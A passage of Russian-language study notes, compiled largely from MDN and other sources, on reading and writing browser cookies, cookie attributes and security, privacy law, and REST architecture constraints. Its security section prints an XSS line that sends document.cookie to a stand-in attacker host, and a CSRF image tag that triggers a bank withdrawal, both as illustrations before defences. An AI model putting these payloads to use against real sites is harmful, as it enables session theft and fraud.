    acc[name] = value
    return acc
  }, {})
}

const cookie = getCookie()

console.log(cookie.counter)
// 1
console.log(cookie.sidebar)
// true

```

Для кук не предусмотрено специального метода удаления, поэтому для этого используется трюк с установкой кук с параметром `expires` который указывает на дату в прошлом. Браузер сразу же считает такую куку устаревшей и удаляет её:

```js

document.cookie = `sidebar=;expires=${new Date(0)}`

```

В этом примере, передав число 0 в конструктор `Date` мы получаем время на начало [эпохи Unix](https://ru.wikipedia.org/wiki/Unix-%D0%B2%D1%80%D0%B5%D0%BC%D1%8F), а именно 1 января 1970 года. Поскольку эта дата из прошлого, то кука будет удалена моментально.

Есть куки, которые нельзя прочитать или записать из JavaScript. Если сервер устанавливает куки с параметром `HttpOnly` (доступен только для установки сервером), то такие куки будут недоступны в `document.cookie`. Как правило, такие куки используются для хранения чувствительной информации, как, например, токены для авторизации. Проверка авторизации происходит с помощью запроса с текущим авторизованным пользователем и считается при успешном ответе сервера.

Формат строки `document.cookie` не очень удобен для работы, поэтому обычно в проекте создают функции, которые упрощают чтение и запись кук. Чтобы не писать эти функции самостоятельно, можно взять библиотеку [js-cookie](https://github.com/js-cookie/js-cookie). Это небольшая обёртка над стандартным браузерным API, которая здорово упрощает жизнь.

С этой библиотекой установка значения для куки выполняется так:

```js

import Cookies from "js-cookie"

Cookies.set("foo", "bar")

```

А чтение так:

```js

import Cookies from "js-cookie"

const nameFromCookie = Cookies.get("name")

```

#####  HTTP-куки

HTTP cookie (web cookie, куки браузера) - это небольшой фрагмент данных, который сервер отправляет браузеру пользователя. Браузер может сохранить этот фрагмент у себя и отправлять на сервер с каждым последующим запросом. Это, в частности, позволяет узнать, с одного ли браузера пришли несколько запросов (например, для аутентификации пользователя). С помощью кук можно сохранить любую информацию о состоянии, HTTP-протокол сам по себе этого делать не умеет.
Куки часто используются для:

- Управления сеансом (логины, корзины для виртуальных покупок)
- Персонализации (пользовательские предпочтения)
- Трекинга (отслеживания поведения пользователей)

До недавнего времени куки использовались в качестве хранилища информации на стороне пользователя. Это могло иметь смысл в отсутствии вариантов, но теперь, когда в распоряжении браузеров появились различные API для хранения данных, это уже не так. Из-за того что куки пересылаются с каждым запросом, они могут ухудшать производительность (особенно при использовании мобильных сетей). В качестве хранилищ данных на стороне пользователя вместо них можно использовать [Web storage API](https://developer.mozilla.org/ru/docs/Web/API/Web_Storage_API) (`localStorage` и `sessionStorage`) и [IndexedDB](https://developer.mozilla.org/ru/docs/Web/API/IndexedDB_API).
###### [Создание куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D1%81%D0%BE%D0%B7%D0%B4%D0%B0%D0%BD%D0%B8%D0%B5_%D0%BA%D1%83%D0%BA%D0%B8)

Получив HTTP-запрос, вместе с ответом сервер может отправить заголовок [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie). Куки обычно запоминаются браузером и посылаются в HTTP-заголовке [`Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cookie) с каждым новым запросом к одному и тому же серверу. Можно задать срок действия кук, а также срок их жизни, после которого куки не будут отправляться. Также можно указать ограничения на путь и домен, то есть указать, в течении какого времени и к какому сайту они будут отсылаться.

Заголовок [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie) HTTP-ответа используется для отправки куки с сервера в клиентское приложение (браузер). Простой куки может задаваться так:

```

Set-Cookie: <имя-куки>=<заголовок-куки>

```

Этот заголовок с сервера даёт клиенту указание сохранить куки (это делают, например, [PHP](http://php.net/manual/en/function.setcookie.php), [Node.js](https://nodejs.org/dist/latest-v6.x/docs/api/http.html#http_response_setheader_name_value), [Python](https://docs.python.org/3/library/http.cookies.html) и [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)). Ответ, отправляемый браузеру, содержит заголовок `Set-Cookie`, и куки запоминается браузером.

```

HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

Теперь с каждым новым запросом к серверу при помощи заголовка [`Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cookie) браузер будет возвращать серверу все сохранённые ранее куки.

```

GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry

```

###### [Сессионные cookie](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%BE%D0%BD%D0%BD%D1%8B%D0%B5_cookie)

Простой cookie, пример которого приведён выше, представляет собой сессионный _cookie_ (_session cookie_) - такие cookie удаляются при закрытии клиента, то есть существуют только на протяжении текущего сеанса, поскольку атрибуты `Expires` или `Max-Age` для него не задаются. Однако, если в браузере включено автоматическое восстановление сеанса, что случается очень часто, cookie сеанса может храниться постоянно, как если бы браузер никогда не закрывался.

###### [Постоянные cookies](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%BF%D0%BE%D1%81%D1%82%D0%BE%D1%8F%D0%BD%D0%BD%D1%8B%D0%B5_cookies)

_Постоянные cookie_ (_permanent cookies_) удаляются не с закрытием клиента, а при наступлении определённой даты (атрибут `Expires`) или после определённого интервала времени (атрибут `Max-Age`).

```

Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

```

###### [`Secure` ("безопасные") и `HttpOnly` куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#secure_%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D1%8B%D0%B5_%D0%B8_httponly_%D0%BA%D1%83%D0%BA%D0%B8)

"Безопасные" (secure) куки отсылаются на сервер только тогда, когда запрос отправляется по протоколу SSL и HTTPS. Однако важные данные никогда не следует передавать или хранить в куках, поскольку сам их механизм весьма уязвим в отношении безопасности, а флаг `secure` никакого дополнительного шифрования или средств защиты не обеспечивает. Начиная с Chrome 52 и Firefox 52, незащищённые сайты (http:) не могут создавать куки с флагом `Secure`.

Куки HTTPonly не доступны из JavaScript через свойства [`Document.cookie`](https://developer.mozilla.org/ru/docs/Web/API/Document/cookie) API, что помогает избежать межсайтового скриптинга ([XSS](https://developer.mozilla.org/ru/docs/Glossary/XSS)). Устанавливайте этот флаг для тех кук, к которым не требуется обращаться через JavaScript. В частности, если куки используются только для поддержки сеанса, то в JavaScript они не нужны, так что в этом случае следует устанавливать флаг `HttpOnly`.

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

###### [Область видимости куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C_%D0%B2%D0%B8%D0%B4%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D0%B8_%D0%BA%D1%83%D0%BA%D0%B8)

Директивы `Domain` и `Path` определяют область видимости куки, то есть те URL-адреса, к которым куки будут отсылаться.

###### Атрибут Domain

Атрибут `Domain` указывает хосты, на которые отсылаются куки. Если он не задан, то по умолчанию берётся доменная часть адреса документа (но без поддоменов). Если домен указан явно, то поддомены всегда включены.

Например, если задано `Domain=mozilla.org`, то куки включены и в поддоменах, например, в `developer.mozilla.org`.

###### Атрибут Path

Атрибут `Path` указывает URL, который должен быть в запрашиваемом ресурсе на момент отправки заголовка `Cookie`. Символ %x2F ("/") интерпретируется как разделитель в URL-пути, подпути также будут учитываться.

Если задан `Path=/docs`, то совпадать будут следующие пути:

- `/docs`
- `/docs/`
- `/docs/Web/`
- `/docs/Web/HTTP`

А эти пути совпадать не будут:

- `/`
- `/docsets`
- `/fr/docs`

###### Куки `SameSite`

Куки отправляются на сервер при любых запросах, даже если запрашивается статический ресурс с чужого сервера, то есть если происходит межсайтовый запрос. Например, если страница сайта site.com содержит изображение сайта site.net, при запросе изображения в запросе будут отправлены все куки пользователя для site.net. Чтобы ограничить отправку кук только тому сайту, которому они принадлежат, используют атрибут SameSite.

C помощью атрибута `SameSite` можно указать, когда и как отправлять куки с межсайтовыми запросами (где сайт определяется комбинацией домена и схемы `http:` или `https:`). В некоторой степени этот атрибут защищает от межсайтовой подделки запроса ([CSRF](https://developer.mozilla.org/ru/docs/Glossary/CSRF)). `SameSite` может принимать три возможных значения: `Strict`, `Lax` и `None`.

С атрибутом `Strict` куки будут отправляться только тому сайту, которому эти куки принадлежат. Атрибут `Lax` работает похоже, но куки будут отправляться также при навигации на тот сайт, которому принадлежат куки. Например, при переходе по ссылке с внешнего сайта. Атрибут `None` отключает ограничение на отправку кук для межсайтовых запросов, но только в безопасном контексте (то есть если установлен `SameSite=None`, тогда также должен быть установлен атрибут `Secure`). Если атрибут `SameSite` не установлен, куки будут восприниматься как `Lax`.

```
Set-Cookie: mykey=myvalue; SameSite=Strict
```

###### Куки с префиксами

Из-за дизайна механизма кук сервер не может подтвердить, что куки были отправлены с защищённого источника (secure origin), или быть уверенным в том, где именно они были установлены.

Уязвимое приложение поддомена может установить куку с атрибутом `Domain`, тем самым открывая к ней доступ на всех других поддоменнах. Этот механизм может эксплуатироваться с атакой _фиксация сессии_.

**Примечание:** Ознакомьтесь со статьёй [фиксация сессии](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#session_fixation), чтобы узнать об основных методах защиты от этой атаки.

Тем не менее в соответствии с принципом [защита в глубину](https://en.wikipedia.org/wiki/Defense_in_depth_\(computing\)) вы можете использовать _куки с префиксами_, чтобы гарантировать специфические факты о куках. Доступны два префикса:

[`__Host-`](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#__host-)

Если в куке содержится этот префикс, она будет установлена заголовком [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie) только в том случае, если кука будет содержать атрибут `Secure` и если запрос будет отправляться из защищённого источника. Также кука не должна включать атрибут `Domain` и должна содержать атрибут `Path` со значением `/`.

[`__Secure-`](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#__secure-)

Если в куке содержится этот префикс, она будет установлена заголовком [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie) только в том случае, если кука будет содержать атрибут `Secure` и если запрос будет отправляться из защищённого источника. Защита с помощью этого префикса слабее по сравнению с префиксом `__Host-`.

Браузеры будут отклонять установку этих кук, если они не будут удовлетворять всем ограничениям. Заметьте, что куки с префиксами, созданные в рамках поддомена, будут ограничиваться только им или будут полностью игнорироваться. Так как бэкенд проверяет только куки с заранее известными именами при авторизации пользователя или валидации CSRF-токена, куки с префиксами фактически работают как защитный механизм от фиксации сессии.

**Примечание:** Бэкенд веб-приложения _обязан_ обращаться по полному имени куки, включая префикс. Пользовательские агенты не удаляют префикс из имени кук перед их отправкой в HTTP-заголовке [`Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cookie).

Для получения информации о статусе поддержки префиксов в разных браузерах обратитесь к статье про [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie).

###### Доступ из JavaScript с помощью `Document.cookie`

Куки можно создавать с помощью JavaScript, используя DOM-свойство [`Document.cookie`](https://developer.mozilla.org/ru/docs/Web/API/Document/cookie). Также можно читать куки из JavaScript, если не был установлен атрибут `HttpOnly`.

```js

document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// выведет "yummy_cookie=choco; tasty_cookie=strawberry"

```

Куки, созданные с помощью JavaScript, не могут содержать атрибут `HttpOnly`.

Пожалуйста, учитывайте вытекающие из этого проблемы, про которые рассказывается ниже в разделе [Безопасность](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C). Куки, доступные для JavaScript, могут быть похищены посредством XSS.

###### [Безопасность](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C)

**Примечание:** При сохранении информации в куках имейте в виду, что у всех пользователей есть возможность просматривать и изменять их значения. В зависимости от типа приложения вы можете использовать ни о чём не говорящее имя для идентификатора кук, смысл которого будет понятен только бэкенду. Также вы можете рассмотреть возможность использования альтернативных механизмов аутентификации и конфиденциальности, например, JSON Web Tokens

Способы предотвращения атак, использующих куки:

- Используйте атрибут `HttpOnly` для предотвращения доступа к кукам из JavaScript.
- Куки, которые используются для хранения чувствительной информации, такой как аутентификационный токен, должны иметь короткое время жизни и атрибут `SameSite`, установленный в `Strict` или `Lax`. Для того чтобы узнать больше, смотрите раздел [SameSite](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%BA%D1%83%D0%BA%D0%B8_samesite). В [браузерах с поддержкой SameSite](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80%D0%B0%D1%85%20%D1%81%20%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D1%80%D0%B6%D0%BA%D0%BE%D0%B9%20SameSite) это гарантирует предотвращение отправки кук аутентификации с межсайтовыми запросами, фактически такие запросы с точки зрения бэкенда становятся неаутентифицированными.

###### [Захват сессии (session hijacking) и XSS](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B7%D0%B0%D1%85%D0%B2%D0%B0%D1%82_%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%B8_session_hijacking_%D0%B8_xss)

Куки часто используются в веб-приложениях для идентификации аутентифицированного пользователя и сеанса работы. Соответственно, похищение кук из приложения может привести к захвату авторизованного сеанса пользователя. Кража кук часто осуществляется посредством социальной инженерии (Social Engineering) и использования уязвимости [XSS](https://developer.mozilla.org/ru/docs/Glossary/XSS)

```js

new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

```

Атрибут HttpOnly помогает уменьшить эту угрозу, перекрывая доступ к кукам из JavaScript.

###### [Межсайтовая подделка запроса (CSRF - Cross-site request forgery)](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%BC%D0%B5%D0%B6%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2%D0%B0%D1%8F_%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D0%BB%D0%BA%D0%B0_%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81%D0%B0_csrf_-_cross-site_request_forgery)

В [Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) есть хороший пример [CSRF](https://developer.mozilla.org/ru/docs/Glossary/CSRF). В сообщение, например, в чате или на форуме, включают "изображение", которое, на самом деле, представляет собой запрос к серверу банка на снятие денег:

```html

<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />

```

Если вы аутентифицированны в своём банковском аккаунте, а куки по-прежнему действительны (и никакой дополнительной проверки не требуется), то при загрузке HTML-документа форума или чата с этим изображением деньги будут переведены с вашего счета. Для защиты от этого используется ряд методов:

- Как и при [XSS](https://developer.mozilla.org/ru/docs/Glossary/XSS), важна фильтрация входящей информации.
- Для любой чувствительной операции должно запрашиваться подтверждение.
- Куки, используемые для чувствительных операций, должны иметь короткий срок действия.
- Дополнительную информацию можно получить в пользовательской инструкции по предотвращению [CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)_Prevention_Cheat_Sheet) на сайте OWASP.

###### [Трекинг и приватность](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D1%82%D1%80%D0%B5%D0%BA%D0%B8%D0%BD%D0%B3_%D0%B8_%D0%BF%D1%80%D0%B8%D0%B2%D0%B0%D1%82%D0%BD%D0%BE%D1%81%D1%82%D1%8C)

###### [Сторонние (Third-party) куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D1%81%D1%82%D0%BE%D1%80%D0%BE%D0%BD%D0%BD%D0%B8%D0%B5_third-party_%D0%BA%D1%83%D0%BA%D0%B8)

Куки ассоциируются с определённым доменом и схемой (такой как `http:` или `https:`). Также они могут быть ассоциированы с поддоменом с помощью атрибута `Domain`. Если домен и схема кук совпадает с доменом и схемой текущей страницы, на которой вы находитесь, то их называют _собственными куками_ (_first-party cookies_). Если домен и схема кук отличается от домена и схемы текущей страницы, то такие куки называют _сторонними куками_ (_third-party cookies_).

Сервер, хостящий страницу, устанавливает собственные куки, но на странице могут находиться изображения и другие компоненты с других доменов (например, баннерная реклама), они в свою очередь могут устанавливать сторонние куки. Сторонние куки часто используются для рекламы и трекинга пользователей в сети. Как пример, можете посмотреть куки, которые [устанавливает Google](https://policies.google.com/technologies/cookies#types-of-cookies).

Третья сторона, контролирующая внедрение сторонних кук, может создать профиль пользователя на основе истории его посещений разных сайтов с помощью кук, отправляемых одним и тем же браузером с разных сайтов. Firefox по умолчанию блокирует сторонние куки, про которые известно, что они используются для трекинга пользователей. Сторонние куки (или просто куки для трекинга) могут также быть заблокированы другими настройками браузера или расширениями. Блокировка кук в некоторых ситуациях может стать причиной некорректного поведения сторонних компонентов, например, виджетов социальных сетей.

**Примечание:** Бэкенд может (и должен) устанавливать у кук [атрибут SameSite](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value) для управления отправкой кук на сторонние серверы.

###### [Законодательство, связанное с куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B7%D0%B0%D0%BA%D0%BE%D0%BD%D0%BE%D0%B4%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%D1%81%D1%82%D0%B2%D0%BE_%D1%81%D0%B2%D1%8F%D0%B7%D0%B0%D0%BD%D0%BD%D0%BE%D0%B5_%D1%81_%D0%BA%D1%83%D0%BA%D0%B8)

Регулирующие акты и законодательство, покрывающие куки, включают:

- General Data Privacy Regulation (GDPR) в Европейском Союзе
- ePrivacy Directive в Европейском Союзе
- California Consumer Privacy Act в Штате Калифорния

Эти акты и директивы действуют глобально. Они применяются ко всем сайтам во Всемирной паутине, к которым пользователи из данных юрисдикций получают доступ (Европейский Союз и Калифорния, с оговоркой, что Калифорнийский закон применяется к компаниям с доходом выше 25 миллионов долларов и несколькими другими оговорками).

Эти акты и директивы включают такие требования как:

- Сообщать пользователям, что сайт использует куки.
- Давать возможность пользователям отказываться от получения всех или некоторых кук.
- Давать возможность пользователям использовать основные функции вашего сервиса без получения кук.

Могут существовать другие законодательные акты, которые применимы к вашей локальной юрисдикции. На вас лежит ответственность знать про них и следовать им. Существуют компании, которые предлагают код с "куки баннером" и берут на себя заботы о следовании законодательству, связанному с куками.

###### [Другие способы хранения информации в браузере](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B4%D1%80%D1%83%D0%B3%D0%B8%D0%B5_%D1%81%D0%BF%D0%BE%D1%81%D0%BE%D0%B1%D1%8B_%D1%85%D1%80%D0%B0%D0%BD%D0%B5%D0%BD%D0%B8%D1%8F_%D0%B8%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%86%D0%B8%D0%B8_%D0%B2_%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80%D0%B5)

Другой способ для хранения данных в браузере — [Web Storage API](https://developer.mozilla.org/ru/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API). Свойства [window.sessionStorage](https://developer.mozilla.org/ru/docs/Web/API/Window/sessionStorage) и [window.localStorage](https://developer.mozilla.org/ru/docs/Web/API/Window/localStorage) подобны сессионным и постоянным кукам, но позволяют хранить больше данных и никогда не отправляются на сервер. Для хранения ещё большего объёма структурированных данных может использоваться [IndexedDB API](https://developer.mozilla.org/ru/docs/Web/API/IndexedDB_API) или библиотеки, построенные поверх него.

Существуют техники для повторной установки кук после их удаления. Такие куки называются куки-зомби. Эти техники нарушают принципы приватности пользователей и пользовательского контроля и могут нарушать законодательства, регулирующие приватность данных, соответственно, использующий их сайт подвержен судебному разбирательству.
##### REST
https://developer.mozilla.org/en-US/docs/Glossary/REST
https://habr.com/ru/articles/38730/
https://habr.com/ru/articles/590679/
https://www.codecademy.com/article/what-is-rest
https://ru.wikipedia.org/wiki/REST

**REST API** — это архитектурный подход, который устанавливает ограничения для API: как они должны быть устроены и какие функции поддерживать. Это позволяет стандартизировать работу программных интерфейсов, сделать их более удобными и производительными.

Слово REST — акроним от Representational State Transfer, что переводится на русский как «передача состояния представления», «передача репрезентативного состояния» или «передача „самоописываемого“ состояния».

В отличие от, например, SOAP API, REST API — не протокол, а простой список рекомендаций, которым можно следовать или не следовать. Поэтому у него нет собственных методов. С другой стороны, его автор Рой Филдинг создал ещё и [протокол HTTP](https://skillbox.ru/media/code/chto-takoe-http-i-zachem-on-nuzhen/?utm_source=media&utm_medium=link&utm_campaign=all_all_media_links_links_articles_all_all_skillbox), так что они очень хорошо сочетаются, и REST обычно используют в связке с HTTP. Хотя новичкам нужно помнить: **REST — это не только HTTP, а HTTP — не только REST**.

Всего в REST есть шесть требований к проектированию API. Пять из них обязательные, одно — опциональное:

- Клиент-серверная модель (client-server model).
- Отсутствие состояния (statelessness).
- Кэширование (cacheability).
- Единообразие интерфейса (uniform interface).
- Многоуровневая система (layered system).
- Код по требованию (code on demand) — необязательно.

###### Клиент-серверная модель (client-server model).
Первым ограничением, применимым к гибридной модели, является приведение архитектуры к модели клиент-сервер. Разграничение потребностей является принципом, лежащим в основе данного накладываемого ограничения. Отделение потребности интерфейса [клиента](https://ru.wikipedia.org/wiki/%D0%9A%D0%BB%D0%B8%D0%B5%D0%BD%D1%82_\(%D0%B8%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B8%D0%BA%D0%B0\) "Клиент (информатика)") от потребностей [сервера, хранящего данные](https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80_\(%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5\) "Сервер (приложение)"), повышает переносимость [кода](https://ru.wikipedia.org/wiki/%D0%9F%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D1%8B%D0%B9_%D0%BA%D0%BE%D0%B4 "Программный код") клиентского [интерфейса](https://ru.wikipedia.org/wiki/%D0%98%D0%BD%D1%82%D0%B5%D1%80%D1%84%D0%B5%D0%B9%D1%81 "Интерфейс") на другие платформы, а упрощение [серверной части](https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80_\(%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5\) "Сервер (приложение)") улучшает масштабируемость. Наибольшее же влияние на [всемирную паутину](https://ru.wikipedia.org/wiki/%D0%92%D1%81%D0%B5%D0%BC%D0%B8%D1%80%D0%BD%D0%B0%D1%8F_%D0%BF%D0%B0%D1%83%D1%82%D0%B8%D0%BD%D0%B0 "Всемирная паутина"), пожалуй, имеет само разграничение, которое позволяет отдельным частям развиваться независимо друг от друга, поддерживая потребности в развитии интернета со стороны различных организаций.

**Сервер** — программа, в которой хранятся и обрабатываются ресурсы. Сервер может располагаться на одном или нескольких компьютерах; но даже в одном компьютере может быть несколько виртуальных серверов. Допустим, изначально HTML-код этой статьи хранился где-то на серверах Skillbox.

**Клиент** — программа, которая запрашивает у сервера доступ к ресурсам. Для этого она использует API. Когда ваш браузер запрашивает у сервера Skillbox эту веб-страницу, он выступает в роли клиента.
Второй принцип настолько важен, что даже отражён в названии архитектурного стиля — **Representational State Transfer**. Это значит, что на сервере не хранится никаких данных о прошлых взаимодействиях с клиентом — каждый запрос должен содержать всю информацию для его обработки.
Если клиент потом хочет получить предпоследнее сообщение, то он не может просто сказать: «Дай мне соседний ресурс» — ему нужно заново составить полный запрос по всем правилам.

Это снижает нагрузку на сервер, что особенно полезно, если к нему подключено одновременно много клиентов. Не нужно хранить дополнительную информацию о прошлых обращениях каждого из них. Достаточно обработать каждый запрос в отдельности.

Даже если какой-то из предыдущих запросов потеряется, это не сломает логику взаимодействия клиента и сервера, потому что каждый запрос самодостаточен.

###### Отсутствие состояния (statelessness).
Протокол взаимодействия между клиентом и сервером требует соблюдения следующего условия: в период между запросами клиента никакая информация о _состоянии_ _клиента_ на сервере не хранится ([Stateless protocol](https://ru.wikipedia.org/wiki/%D0%9F%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB_%D0%B1%D0%B5%D0%B7_%D1%81%D0%BE%D1%85%D1%80%D0%B0%D0%BD%D0%B5%D0%BD%D0%B8%D1%8F_%D1%81%D0%BE%D1%81%D1%82%D0%BE%D1%8F%D0%BD%D0%B8%D1%8F "Протокол без сохранения состояния") или «протокол без сохранения состояния»). Все запросы от клиента должны быть составлены так, чтобы сервер получил всю необходимую информацию для выполнения запроса. _Состояние_ _сессии_ при этом сохраняется на стороне клиента[[3]](https://ru.wikipedia.org/wiki/REST#cite_note-Fielding-Ch5-3). Информация о состоянии сессии может быть передана сервером какому-либо другому сервису (например, в службу базы данных) для поддержания устойчивого состояния, например, на период установления аутентификации. Клиент инициирует отправку запросов, когда он готов (возникает необходимость) перейти в новое состояние.

Во время обработки клиентских запросов считается, что клиент находится в _переходном состоянии_. Каждое отдельное _состояние_ _приложения_ представлено связями, которые могут быть задействованы при следующем обращении клиента.

###### Кэширование (cacheability).

Иногда клиент запрашивает с сервера одни и те же данные по несколько раз — например, вы постоянно обращаетесь к какому-нибудь важному письму в сервисе для учёта деловых переписок.

Если при каждом таком запросе сервер будет с нуля собирать нужные данные и отправлять их клиенту, нагрузка на систему повысится — особенно когда таких повторов много. Решением проблемы в REST API стало **кэширование**, то есть сохранение части данных у клиента или на промежуточных серверах.

###### **Единообразие интерфейса**

Должен быть **единый способ обращения** к каждому ресурсу. Например, мы хотим добавить в наш сервис новую функциональность для просмотра данных о денежных переводах. Понятно, что логика интерфейса для обращения к ним должна быть такой же, как и для всего, что было в сервисе раньше.

Наличие унифицированного интерфейса является фундаментальным требованием дизайна REST-сервисов[[3]](https://ru.wikipedia.org/wiki/REST#cite_note-Fielding-Ch5-3). Унифицированные интерфейсы позволяют каждому из сервисов развиваться независимо.

К унифицированным интерфейсам предъявляются следующие четыре ограничительных условия[[10]](https://ru.wikipedia.org/wiki/REST#cite_note-_a0e7ce7946f0bdab-10)[[11]](https://ru.wikipedia.org/wiki/REST#cite_note-11):

**Идентификация ресурсов**  
Все ресурсы идентифицируются в запросах, например, с использованием [URI](https://ru.wikipedia.org/wiki/URI "URI") в интернет-системах. Ресурсы концептуально отделены от представлений, которые возвращаются клиентам. Например, [сервер](https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80_\(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D0%BE%D0%B5_%D0%BE%D0%B1%D0%B5%D1%81%D0%BF%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D0%B5\) "Сервер (программное обеспечение)") может отсылать данные из [базы данных](https://ru.wikipedia.org/wiki/%D0%91%D0%B0%D0%B7%D0%B0_%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85 "База данных") в виде [HTML](https://ru.wikipedia.org/wiki/HTML "HTML"), [XML](https://ru.wikipedia.org/wiki/XML "XML") или [JSON](https://ru.wikipedia.org/wiki/JSON "JSON"), ни один из которых не является типом хранения внутри сервера.

**Манипуляция ресурсами через представление**  
Если клиент хранит представление ресурса, включая метаданные — он обладает достаточной информацией для модификации или удаления ресурса.

**«Самоописываемые» сообщения**  
Каждое сообщение содержит достаточно информации, чтобы понять, каким образом его обрабатывать. К примеру, обработчик сообщения (parser), необходимый для извлечения данных, может быть указан в [списке MIME-типов](https://ru.wikipedia.org/wiki/%D0%A1%D0%BF%D0%B8%D1%81%D0%BE%D0%BA_MIME-%D1%82%D0%B8%D0%BF%D0%BE%D0%B2 "Список MIME-типов")[[3]](https://ru.wikipedia.org/wiki/REST#cite_note-Fielding-Ch5-3).

**Гипермедиа как средство изменения состояния приложения ([HATEOAS](https://ru.wikipedia.org/wiki/HATEOAS "HATEOAS"))**  
Клиенты изменяют состояние системы только через действия, которые динамически определены в гипермедиа на сервере (к примеру, [гиперссылки](https://ru.wikipedia.org/wiki/%D0%93%D0%B8%D0%BF%D0%B5%D1%80%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B0 "Гиперссылка") в [гипертексте](https://ru.wikipedia.org/wiki/%D0%93%D0%B8%D0%BF%D0%B5%D1%80%D1%82%D0%B5%D0%BA%D1%81%D1%82 "Гипертекст")). Исключая простые точки входа в приложение, клиент не может предположить, что доступна какая-то операция над каким-то ресурсом, если не получил информацию об этом в предыдущих запросах к серверу. Не существует универсального формата для предоставления ссылок между ресурсами, Web Linking ([RFC 5988](https://datatracker.ietf.org/doc/html/rfc5988) -> [RFC 8288](https://datatracker.ietf.org/doc/html/rfc8288)) и [JSON Hypermedia API Language](https://tools.ietf.org/id/draft-kelly-json-hal-03.txt) [Архивная копия](https://web.archive.org/web/20140627002807/https://tools.ietf.org/id/draft-kelly-json-hal-03.txt) от 27 июня 2014 на [Wayback Machine](https://ru.wikipedia.org/wiki/Wayback_Machine "Wayback Machine") являются двумя популярными форматами предоставления ссылок в REST HYPERMEDIA сервисах.

###### **Многоуровневая система**

